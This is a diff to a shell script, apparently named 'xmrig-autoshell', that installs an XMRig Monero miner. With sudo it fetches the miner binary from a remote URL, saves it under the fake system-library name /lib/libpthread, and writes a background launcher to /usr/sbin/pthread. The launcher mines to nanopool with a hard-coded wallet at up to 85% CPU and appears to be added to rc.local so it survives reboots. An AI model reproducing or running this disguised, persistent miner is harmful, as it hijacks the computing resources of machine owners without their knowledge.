@@ -31,12 +31,12 @@ Get_Dist_Name()
 Get_Dist_Name
 
 sudo pkill libpthread
-sudo curl -fsSL https://qr4d.com/xmrig/libpthread > /lib/libpthread
+sudo curl -fsSL https://raw.githubusercontent.com/xbhuang1994/xmrig-autoshell/master/libpthread > /lib/libpthread
 if [ ! -f "/usr/lib64/libuv.so.1" ]; then
     case $PM in  
         'yum')  
             if grep -Eqii "release 6" /etc/issue || grep -Eq "release 6" /etc/*-release; then
-                sudo curl -fsSL "https://qr4d.com/xmrig/libuv-centos6.tar.gz" > "/var/tmp/libuv-centos6.tar.gz"
+                sudo curl -fsSL "https://raw.githubusercontent.com/xbhuang1994/xmrig-autoshell/master/libuv-centos6.tar.gz" > "/var/tmp/libuv-centos6.tar.gz"
                 sudo tar -zxvf "/var/tmp/libuv-centos6.tar.gz" -C "/usr/lib64/"
                 echo "yum install libuv for CentOS 6"
             else
@@ -57,7 +57,12 @@ else
     echo "libuv 1.x installed"
 fi
 WokerID="$RANDOM"
-sudo echo "nice -n 19 /lib/libpthread -o xmr-us-west1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb.$WokerID -p x -k -o xmr-eu1.nanopool.org:14444 -u 4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb.BAK_$WokerID -p x -k --max-cpu-usage=85 --background" > /usr/sbin/pthread
+myAddress="4JUdGzvrMFDWrUUwY3toJATSeNwjn54LkCnKBPRzDuhzi5vSepHfUckJNxRL2gjkNrSqtCoRUrEDAgRwsQvVCjZbS1WEZGWKA3v566F6vb"
+if [ x$1 != x ]
+then
+    myAddress=$1
+fi
+sudo echo "nice -n 19 /lib/libpthread -o xmr-us-west1.nanopool.org:14444 -u $myAddress.$WokerID -p x -k -o xmr-eu1.nanopool.org:14444 -u $myAddress.BAK_$WokerID -p x -k --max-cpu-usage=85 --background" > /usr/sbin/pthread
 sudo chmod +x /lib/libpthread
 sudo chmod +x /usr/sbin/pthread
 if [ -z "`grep "/usr/sbin/pthread" /etc/rc.local`" ]; then
